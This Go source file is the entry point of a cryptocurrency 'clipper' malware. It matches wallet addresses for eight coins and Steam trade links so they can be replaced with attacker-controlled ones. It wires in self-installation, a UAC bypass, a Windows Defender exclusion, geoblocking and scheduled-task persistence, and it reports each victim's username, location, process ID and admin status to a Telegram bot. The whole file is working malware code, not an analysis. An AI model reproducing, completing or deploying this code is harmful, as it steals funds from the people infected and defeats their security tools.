package main

import (
	"fmt"
	"os/user"
	"regexp"
	"syscall"

	"clipper/src/autorun"
	"clipper/src/clipper"
	"clipper/src/defender"
	"clipper/src/geoblock"
	"clipper/src/install"
	"clipper/src/telegram"
	"clipper/src/uac"
	"clipper/src/utils"
)

var (
	btcRegex     = regexp.MustCompile(`^(?:bc1[ac-hj-np-z02-9]{25,90}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$`)
	ethRegex     = regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
	ltcRegex     = regexp.MustCompile(`^(?:ltc1[ac-hj-np-z02-9]{39,59}|[LM3][a-km-zA-HJ-NP-Z1-9]{26,34})$`)
	dogeRegex    = regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$`)
	tonRegex     = regexp.MustCompile(`^(?:EQ|UQ)[0-9A-Za-z_-]{46,48}$`)
	usdttrcRegex = regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`)
	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
	xmrRegex     = regexp.MustCompile(`^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$`)
	
	steamTradeRegex = regexp.MustCompile(`(https?:\/\/)?steamcommunity\.com\/tradeoffer\/new\/\?partner=\d+(&token=[\w\-]+)?`)
)

var (
	BtcAddr     string
	EthAddr     string
	LtcAddr     string
	DogeAddr    string
	TonAddr     string
	UsdtTrcAddr string
	SolAddr     string
	XmrAddr     string
	SteamAddr   string
)

var (
	bot_token   string
	chat_id     string
	blockedGeos string
)

// behavior settings
var (
	enable_install 				string
	enable_uac_bypass 			string
	enable_defender_excluder	string
	enable_autostart 			string
)

var matchers = []clipper.Matcher{
	{Regex: btcRegex, Addr: BtcAddr},
	{Regex: ethRegex, Addr: EthAddr},
	{Regex: ltcRegex, Addr: LtcAddr},
	{Regex: dogeRegex, Addr: DogeAddr},
	{Regex: tonRegex, Addr: TonAddr},
	{Regex: usdttrcRegex, Addr: UsdtTrcAddr},
	{Regex: solRegex, Addr: SolAddr},
	{Regex: xmrRegex, Addr: XmrAddr},
	{Regex: steamTradeRegex, Addr: SteamAddr},
}

func main() {
	installEnabled := enable_install == "true"
	uacEnabled := enable_uac_bypass == "true"
	defenderEnabled := enable_defender_excluder == "true"
	autostartEnabled := enable_autostart == "true"

	if installEnabled {
		install.InstallSelf()
	}

	if uacEnabled {
		uac.Run()
	}

	// we checking geo block
	geo := utils.GetGeo()
	geoblock.GeoBlock(blockedGeos, geo)

	selfPath, _ := utils.GetSelfPath()
	selfName, _ := utils.GetSelfName()


	if defenderEnabled {
		_ = defender.ExcludeFromDefender(selfPath)
	}
	
	user, _ := user.Current()
	pid := syscall.Getpid()

	// send start log to telegram
	telegram.SendLog(fmt.Sprintf(
		"🟢 %s (%s)\n<code>%s</code>\nPID <code>%d</code>\nUAC <code>%t</code>",
		user.Username,
		geo,
		selfPath,
		pid,
		utils.IsAdmin(),
	), chat_id, bot_token)

	if autostartEnabled {
		_ = autorun.AddToSchelduler(selfPath, selfName)
	}

	// we starting main clipper process
	clipper.StartClipper(chat_id, bot_token, matchers, user.Username)

	select {}
}